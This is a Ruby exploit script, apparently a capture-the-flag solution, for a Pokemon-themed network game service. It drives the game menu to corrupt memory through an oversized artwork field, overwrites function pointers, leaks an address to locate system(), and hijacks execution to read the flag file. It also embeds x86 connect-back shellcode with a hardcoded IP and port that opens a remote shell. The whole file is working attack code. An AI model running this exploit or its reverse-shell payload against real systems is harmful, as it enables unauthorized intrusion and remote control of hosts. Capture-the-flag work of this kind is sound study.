require 'socket'

@@s = TCPSocket.new("localhost", 4445)
#@@s = TCPSocket.new('54.80.112.128', 1313)


SHELLCODE = ("\x90" * 30) +
"\x68" +
"\xce\xdc\xc4\x3b" +  # <- IP Number
"\x5e\x66\x68" +
"\xd9\x03" +          # <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02" +
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79" +
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a" +
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f" +
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +
"\xeb\xce\xcc"

REAL_SYSTEM_OFFSET = 0x8b500
MY_SYSTEM_OFFSET = 0x83ea0

#SYSTEM_OFFSET = MY_SYSTEM_OFFSET
SYSTEM_OFFSET = REAL_SYSTEM_OFFSET

def test_read(length = 10000)
  return @@s.recv(length)
end

def do_read(note, expected, size = 10000)
  puts("***#{note}*** [waiting for #{expected}]")
  data = ''
  loop do
    new_data = @@s.recv(size)
    puts(new_data)
    data += new_data
    if(expected.is_a?(String))
      if(data.include?(expected))
        return data
      end
    else
      expected.each do |i|
        if(data.include?(i))
          return data
        end
      end
    end
  end
end

def send(data)
  puts("[sending #{data}]")
  @@s.puts(data)
end

def check_grass()
  send("1")
  result = do_read('checking grass', ['You failed to find any Pokemon', 'Run'])

  return result
end

def run()
  send('3')
end

def find_pokemon(type)
  do_read('menu', 'Change Pokemon artwork')
  loop do
    result = check_grass()
    if(result.include?(type))
      puts("---Found a #{type}!")
      return
    elsif(result.include?('A wild'))
      puts("---Running!")
      run()
    else
      puts("---Found nothing...")
    end
  end
end

def catch_pokemon(type, name)
  find_pokemon(type)

  # If it's a charizard, injure it
  if(type == 'Charizard')
    # Attack it three times first
    send('1')
    do_read('attacking', 'Run')
    send('1')
    do_read('attacking', 'Run')
    send('1')
    do_read('attacking', 'Run')
    send('1')
    do_read('attacking', 'Run')
  end

  send('2')

  result = do_read('caught', 'name this Pokemon')
  send(name + "\n")
  puts("Caught %s" % name)

  # Swap him out, triggering the vulnerability
  if(type == 'Charizard')
    do_read('replace', 'Choose a pokemon to replace')
    send('2')
  end
end

def set_art(id, art)
  do_read('menu', 'Change Pokemon artwork')
  send('5')
  do_read('list', 'Choose a Pokemo')
  send(id)
  sleep(0.25)
  send(art)
end

def stats(length = 10000)
  do_read('menu', 'Change Pokemon artwork')
  send('3')
  sleep(0.25)

  return test_read(length)
end

# Jumps to the given address. Assumes that the attack is already set up
def jump_to_address(addr)
  health = 69
  attackPower = 9999
  pStatsFunc = addr
  pAttackName = 0x08048512
  art = 'A'*(0x204-0xF) + [health, attackPower, pAttackName, pStatsFunc].pack('IIII')

  # For attacks, uses BirdJesus struct
  health = 9876
  damage = 4321
  #0x0804BFAC+4 #.bss PokemonArray[1]
  pAttackName = 0x08048512
  art += 'B'*(0x5E8 - 0xF - art.length) + [health, damage, pAttackName, addr].pack('IIII')
  jmpOffset = art.length
  art += SHELLCODE

  art += 'C'*(2128 - art.length) + "A"

  set_art(2, art)

  puts("///")
  result = stats()
  puts(result)
  puts("\\\\\\")

  return result
end

# Reads up to a null pointer. Assumes that the attack is already set up
def get_read_address()
  health = 69
  attackPower = 9999
  pStatsFunc = 0x08048766
  pAttackName = 0x08048512
  art = 'A'*(0x204-0xF) + [health, attackPower, pAttackName, pStatsFunc].pack('IIII')

  # For attacks, uses BirdJesus struct
  health = 9876
  damage = 4321
  #0x0804BFAC+4 #.bss PokemonArray[1]
  pAttackName = 0x08048512
  art += 'B'*(0x5EC - 0xF - art.length) + [health, damage, pAttackName].pack('III')
  jmpOffset = art.length
  art += SHELLCODE

  art += 'C'*(2128 - art.length) + "A"

  set_art(2, art)
  result = stats(3000) # Don't read the next menu, that messes up everything

  result = result.split("\n").join()
  result = result.gsub(/.*9999Attack: /, '')
  result = result.gsub(/Name: Kack2.*/, '')
  result = result.unpack('I').pop

  return result
end

catch_pokemon('Kakuna', 'Kack1')
catch_pokemon('Kakuna', 'Kack2')
catch_pokemon('Kakuna', 'Kack3')
catch_pokemon('Kakuna', 'Kack4')
catch_pokemon('Charizard', "char") # edx will end up pointing to this

read_address = get_read_address() 
SYSTEM_ADDRESS = read_address - SYSTEM_OFFSET
puts("system() found at 0x%08x! Attempting to jump there!" % SYSTEM_ADDRESS)

#catch_pokemon('Charizard', "ls -lR /") # edx will end up pointing to this
catch_pokemon('Charizard', "cat ~kappa/f*") # edx will end up pointing to this

jump_to_address(read_address - SYSTEM_OFFSET)

loop do
puts test_read()
end
puts("Done?")
